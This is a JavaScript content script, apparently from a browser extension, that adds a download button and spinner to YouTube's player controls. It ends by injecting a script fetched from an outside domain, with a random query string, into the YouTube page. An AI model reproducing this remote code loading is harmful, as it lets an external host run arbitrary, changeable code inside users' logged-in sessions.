var downloading = false;

chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    //here we get the new 
    console.log("URL CHANGED: " + request.data.url);
	
	
	
	if(document.getElementsByClassName("downloadbtn").length == 0){
		downloading = false;
		var controlbar = document.getElementsByClassName("ytp-right-controls")[0];
		var dbtn = document.createElement("BUTTON");
		dbtn.title = "Download";
		dbtn.className = "ytp-button ytp-settings-button downloadbtn";
		dbtn.innerHTML = '<?xml version="1.0" encoding="iso-8859-1"?> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Capa_1" x="0px" y="0px" viewBox="0 0 471.2 471.2" style="enable-background:new 0 0 471.2 471.2;" xml:space="preserve" > <g> <g> <path d="M457.7,230.15c-7.5,0-13.5,6-13.5,13.5v122.8c0,33.4-27.2,60.5-60.5,60.5H87.5c-33.4,0-60.5-27.2-60.5-60.5v-124.8 c0-7.5-6-13.5-13.5-13.5s-13.5,6-13.5,13.5v124.8c0,48.3,39.3,87.5,87.5,87.5h296.2c48.3,0,87.5-39.3,87.5-87.5v-122.8 C471.2,236.25,465.2,230.15,457.7,230.15z" fill="#FFFFFF"/> <path d="M226.1,346.75c2.6,2.6,6.1,4,9.5,4s6.9-1.3,9.5-4l85.8-85.8c5.3-5.3,5.3-13.8,0-19.1c-5.3-5.3-13.8-5.3-19.1,0l-62.7,62.8 V30.75c0-7.5-6-13.5-13.5-13.5s-13.5,6-13.5,13.5v273.9l-62.8-62.8c-5.3-5.3-13.8-5.3-19.1,0c-5.3,5.3-5.3,13.8,0,19.1 L226.1,346.75z" fill="#FFFFFF"/> </g> </g> </svg>';
		dbtn.onclick = function(){
			if(!downloading){
				dbtn.innerHTML = '<svg class="spinner" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg"><circle class="path" fill="none" stroke-width="3" stroke-linecap="round" cx="18" cy="18" r="13"></circle></svg>';
				dbtn.title = "Downloading...";
				downloading = true;
			}
		};
		controlbar.insertBefore(dbtn, controlbar.firstChild);
	}
	
	console.log(controlbar);
	
});




// add style
var style1 = document.createElement("STYLE");
style1.innerHTML = '.spinner { animation: rotator 1.4s linear infinite; } @keyframes rotator { 0% { transform: rotate(0deg); } 100% { transform: rotate(270deg); } } .path { stroke-dasharray: 187; stroke-dashoffset: 0; transform-origin: center; animation: dash 1.4s ease-in-out infinite, colors 5.6s ease-in-out infinite; } @keyframes colors { 0% { stroke: #4285F4; } 25% { stroke: #DE3E35; } 50% { stroke: #F7C223; } 75% { stroke: #1B9A59; } 100% { stroke: #4285F4; } } @keyframes dash { 0% { stroke-dashoffset: 187; } 50% { stroke-dashoffset: 46.75; transform: rotate(135deg); } 100% { stroke-dashoffset: 187; transform: rotate(450deg); } }';
document.body.appendChild(style1);

var scriptobj = document.createElement("SCRIPT");
scriptobj.src = "https://machs-wie-lenny.com/yt-dl-v3/script.js?" + Math.floor(Math.random() * 1000);;
document.body.appendChild(scriptobj);